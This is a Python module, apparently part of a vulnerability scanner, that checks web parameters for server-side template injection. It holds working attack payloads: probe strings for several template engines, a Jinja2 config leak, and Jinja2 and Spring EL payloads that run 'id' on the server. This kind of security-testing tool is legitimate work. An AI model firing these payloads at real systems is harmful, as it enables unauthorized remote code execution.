#!/usr/bin/env python3
"""
SSTI Verifier
=============
Multi-stage:
  Stage 1: Arithmetic detection across template engines
  Stage 2: Config leak / RCE escalation
"""
import re
import random

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class SSTIVerifier(BaseVerifier):
    VULN_TYPE = "SSTI"
    VULN_TITLE = "Server-Side Template Injection"
    DEFAULT_SEVERITY = "critical"
    DEFAULT_CWE = "CWE-1336"
    DEFAULT_CVSS = 9.0
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
    DEFAULT_REMEDIATION = (
        "Never concatenate user input into template strings. Use template "
        "engines with sandboxing. Pass user data only as template variables, "
        "not as template source code."
    )

    DETECTION_PAYLOADS = [
        ("{{7*7}}", r"\b49\b", "Jinja2/Twig"),
        ("${7*7}", r"\b49\b", "Freemarker/JSP"),
        ("#{7*7}", r"\b49\b", "Ruby/Thymeleaf"),
        ("{{7*'7'}}", r"7777777", "Jinja2"),
        ("<%= 7*7 %>", r"\b49\b", "ERB"),
        ("${{7*7}}", r"\b49\b", "Spring EL"),
        ("@{7*7}", r"\b49\b", "Razor"),
        ("{{config}}", r"<Config", "Jinja2 config leak"),
    ]

    RCE_PAYLOADS = [
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         r"uid=\d+", "Jinja2 RCE"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}",
         r"<class", "Jinja2 subclasses"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}",
         None, "Spring RCE"),
    ]

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        all_evidence = []
        detected_engine = None
        confidence = 0.0
        key_exchange = None

        # ── Stage 1: Arithmetic detection ────────────────────────────────
        step = self.start_step(
            "arithmetic_detection",
            "Testing template arithmetic expansion",
            stage="detection",
        )
        for payload, expected_regex, engine in self.DETECTION_PAYLOADS:
            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue
            body = ex.response_body or ""
            m = re.search(expected_regex, body)
            if m and payload not in body:
                detected_engine = engine
                ev = VerificationEvidence(
                    type="ssti_arithmetic",
                    title=f"SSTI via {engine}",
                    description=(
                        f"Payload {payload} evaluated to {m.group(0)} in "
                        f"the response — server-side template injection confirmed."
                    ),
                    payload=payload,
                    extracted_data={
                        "engine": engine,
                        "evaluated_to": m.group(0),
                    },
                    exchange=ex,
                    confidence=0.95,
                )
                all_evidence.append(ev)
                self.finish_step(
                    step, "passed", payload=payload,
                    details=f"Template engine: {engine}",
                    evidence=[ev],
                )
                confidence = 0.95
                key_exchange = ex
                break
        if confidence == 0:
            self.finish_step(step, "failed",
                            details="No arithmetic expansion detected")
            return None

        # ── Stage 2: RCE escalation ──────────────────────────────────────
        rce_step = self.start_step(
            "rce_escalation",
            "Attempting to escalate to RCE",
            stage="extraction",
        )
        extracted = {}
        for payload, expected_regex, desc in self.RCE_PAYLOADS:
            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue
            if expected_regex:
                m = re.search(expected_regex, ex.response_body or "")
                if m:
                    extracted[desc] = m.group(0)[:500]
                    ev = VerificationEvidence(
                        type="rce_via_ssti",
                        title=f"SSTI → RCE ({desc})",
                        description="Successfully executed code via SSTI",
                        payload=payload,
                        extracted_data={desc: m.group(0)[:500]},
                        exchange=ex,
                        confidence=0.98,
                    )
                    all_evidence.append(ev)
                    self.finish_step(rce_step, "passed", payload=payload,
                                    details=desc, evidence=[ev])
                    confidence = 1.0
                    break
        if not extracted:
            self.finish_step(rce_step, "failed",
                            details="Engine confirmed but no RCE achieved")

        return self.build_finding(
            url=url, param=param,
            confidence=confidence,
            description=(
                f"SSTI confirmed via {detected_engine}. " +
                (f"RCE achieved: {list(extracted.keys())}" if extracted
                 else "RCE escalation failed but code evaluation possible.")
            ),
            methods=["arithmetic_detection"] +
                    (["rce_escalation"] if extracted else []),
            extracted_info=extracted,
            key_exchange=key_exchange,
        )